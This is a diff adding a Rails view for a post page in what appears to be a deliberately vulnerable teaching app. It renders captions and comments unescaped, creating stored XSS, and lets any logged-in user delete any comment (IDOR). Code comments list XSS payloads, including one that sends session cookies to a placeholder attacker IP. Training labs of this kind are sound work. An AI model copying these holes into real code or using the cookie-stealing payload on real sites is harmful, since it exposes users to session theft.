@@ -1,0 +1,121 @@
+<div class="max-w-2xl mx-auto">
+
+  <%# ── Post card ───────────────────────────────────────────── %>
+  <div class="bg-white border border-gray-200 rounded-2xl overflow-hidden shadow-sm mb-6">
+
+    <% if @post.image_url.present? %>
+      <img src="<%= @post.image_url %>" alt="<%= @post.title %>"
+           class="w-full max-h-96 object-cover">
+    <% end %>
+
+    <div class="p-5">
+      <%# Author row %>
+      <div class="flex items-center justify-between mb-3">
+        <div class="flex items-center gap-2">
+          <div class="w-8 h-8 rounded-full bg-gradient-to-br from-blue-400 to-purple-500
+                      flex items-center justify-center text-white text-sm font-bold">
+            <%= @post.user.username[0].upcase %>
+          </div>
+          <span class="text-sm font-semibold">
+            <%= link_to @post.user.username, user_path(@post.user), class: "hover:underline" %>
+          </span>
+        </div>
+
+        <% if logged_in? %>
+          <%= button_to "Delete post", post_path(@post), method: :delete,
+              data: { turbo_confirm: "Delete this post?" },
+              class: "text-xs text-red-400 hover:text-red-600 bg-transparent border-0 cursor-pointer font-medium" %>
+        <% end %>
+      </div>
+
+      <h1 class="text-xl font-bold mb-2"><%= @post.title %></h1>
+
+      <%#
+        ⚠️  VULNERABILITY — Stored XSS in caption
+        Wrap the caption in raw() so HTML is rendered unescaped.
+
+        Attack payloads to try when creating a post:
+          <script>alert('XSS from caption!')</script>
+          <img src=x onerror="alert('onerror XSS — no script tag needed')">
+          <script>new Image().src='http://YOUR_IP/?c='+document.cookie</script>
+
+        The last payload exfiltrates the session cookie to an attacker's
+        server — any user who views this post loses their session.
+      %>
+      <p class="text-gray-700 leading-relaxed"><%= raw @post.caption %></p>
+
+      <p class="text-xs text-gray-400 mt-3">
+        <%= @post.created_at.strftime("%B %d, %Y") %>
+      </p>
+    </div>
+  </div>
+
+  <%# ── Comments ────────────────────────────────────────────── %>
+  <div class="mb-6">
+    <h2 class="text-base font-bold mb-4">
+      Comments <span class="text-gray-400 font-normal">(<%= @comments.count %>)</span>
+    </h2>
+
+    <% if @comments.any? %>
+      <div class="space-y-3">
+        <% @comments.each do |comment| %>
+          <div class="bg-white border border-gray-200 rounded-xl px-4 py-3 flex items-start justify-between gap-3">
+            <div class="flex-1 min-w-0">
+              <p class="text-xs font-semibold text-gray-700 mb-1">
+                <%= link_to comment.user.username, user_path(comment.user), class: "hover:underline" %>
+              </p>
+
+              <%#
+                ⚠️  VULNERABILITY — Stored XSS in comment body
+                This is the most dangerous XSS vector because comments
+                are written by one user and seen by ALL viewers of the post.
+                That is called "Stored XSS" — the payload persists in the
+                database and fires automatically for every future visitor.
+
+                Try submitting:
+                  <b>Bold text</b>         (confirms HTML renders)
+                  <img src=x onerror="alert(document.cookie)">
+              %>
+              <p class="text-sm text-gray-800"><%= raw comment.body %></p>
+            </div>
+
+            <% if logged_in? %>
+              <%#
+                ⚠️  VULNERABILITY — IDOR on comment delete
+                No check that the comment belongs to current_user.
+              %>
+              <%= button_to "×", post_comment_path(@post, comment), method: :delete,
+                  class: "text-gray-300 hover:text-red-400 text-lg leading-none bg-transparent border-0 cursor-pointer flex-shrink-0 mt-0.5" %>
+            <% end %>
+          </div>
+        <% end %>
+      </div>
+    <% else %>
+      <p class="text-gray-400 text-sm">No comments yet.</p>
+    <% end %>
+  </div>
+
+  <%# ── Add comment form ────────────────────────────────────── %>
+  <% if logged_in? %>
+    <div class="bg-white border border-gray-200 rounded-2xl p-5">
+      <h3 class="text-sm font-bold mb-3">
+        Add a comment
+        <span class="text-red-400 font-normal text-xs">(XSS target — HTML is rendered)</span>
+      </h3>
+
+      <%= form_with model: [@post, @comment], local: true do |f| %>
+        <%= f.text_area :body,
+            placeholder: "Write something… or try <script>alert(1)</script>",
+            rows: 3,
+            class: "w-full border border-gray-300 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400 resize-none mb-3" %>
+        <%= f.submit "Post Comment",
+            class: "bg-blue-500 hover:bg-blue-600 text-white text-sm font-semibold px-5 py-2 rounded-lg cursor-pointer transition" %>
+      <% end %>
+    </div>
+  <% else %>
+    <p class="text-sm text-gray-400 text-center">
+      <%= link_to "Log in", login_path, class: "text-blue-500 hover:underline" %> to leave a comment.
+    </p>
+  <% end %>
+
+</div>
